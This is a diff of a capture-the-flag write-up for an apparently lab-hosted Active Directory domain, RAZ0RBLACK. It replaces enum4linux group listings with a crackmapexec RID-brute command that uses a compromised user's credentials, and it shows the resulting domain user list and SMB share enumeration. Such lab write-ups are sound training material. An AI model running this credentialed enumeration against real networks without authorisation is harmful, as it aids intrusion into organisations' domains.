@@ -249,35 +249,9 @@ Started: Thu Jul 22 14:10:43 2021
 Stopped: Thu Jul 22 14:11:05 2021
 ```
 
-After getting the password I tried obtaining data from ldap using  ldapdomaindump, and from SMB using enum4linux. That returned a load of data, but nothing relevant to share.
+After getting twilliam's password I tried obtaining data from ldap using  ldapdomaindump, and from SMB using enum4linux.
+The thrash share below from the enum4linux extract is interesting but we can't list its contents with the user twilliams.
 
-Perhaps the most interesting thing to show are these extracts from the enum4linux output.
-The first one listing the current domain users.
-```
-[+] Getting domain group memberships:
-Group 'Group Policy Creator Owners' (RID: 520) has member: RAZ0RBLACK\Administrator
-Group 'Domain Controllers' (RID: 516) has member: RAZ0RBLACK\HAVEN-DC$
-Group 'Domain Admins' (RID: 512) has member: RAZ0RBLACK\Administrator
-Group 'Schema Admins' (RID: 518) has member: RAZ0RBLACK\Administrator
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\Administrator
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\krbtgt
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\xyan1d3
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\lvetrova
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\sbradley
-Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\twilliams
-Group 'Domain Guests' (RID: 514) has member: RAZ0RBLACK\Guest
-Group 'Enterprise Admins' (RID: 519) has member: RAZ0RBLACK\Administrator
-```
-
-It is worth noting that our 3 usual suspects from the spreadsheet are still listed as members of the Raz0rBlack domain:
-- lvetrova
-- sbradley
-- twilliams
-
-As usual there is a super admin named Administrator, but we found a new one worth to keep an eye on:
-- xyan1d3
-
-The second one listing the shares.
 ```
  ========================================= 
 |    Share Enumeration on 10.10.49.242    |
@@ -309,7 +283,19 @@ NT_STATUS_INVALID_INFO_CLASS listing \*
 //10.10.49.242/trash    Mapping: OK     Listing: DENIED
 ```
 
-The thrash share above is interesting. We can't list its contents with the user twilliams, perhaps another user can...
+I also used twilliams's credentials to dump the current domain users using crackmapexec rid brute:
+
+```
+└─$ crackmapexec smb RAZ0RBLACK.THM -u twilliams -p ******** --rid-brute | grep TypeUser
+SMB         10.10.255.71    445    HAVEN-DC         500: RAZ0RBLACK\Administrator (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         501: RAZ0RBLACK\Guest (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         502: RAZ0RBLACK\krbtgt (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         1107: RAZ0RBLACK\lvetrova (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         1108: RAZ0RBLACK\sbradley (SidTypeUser)
+SMB         10.10.255.71    445    HAVEN-DC         1109: RAZ0RBLACK\twilliams (SidTypeUser)
+```
 
 ## Checking for password re-use
 
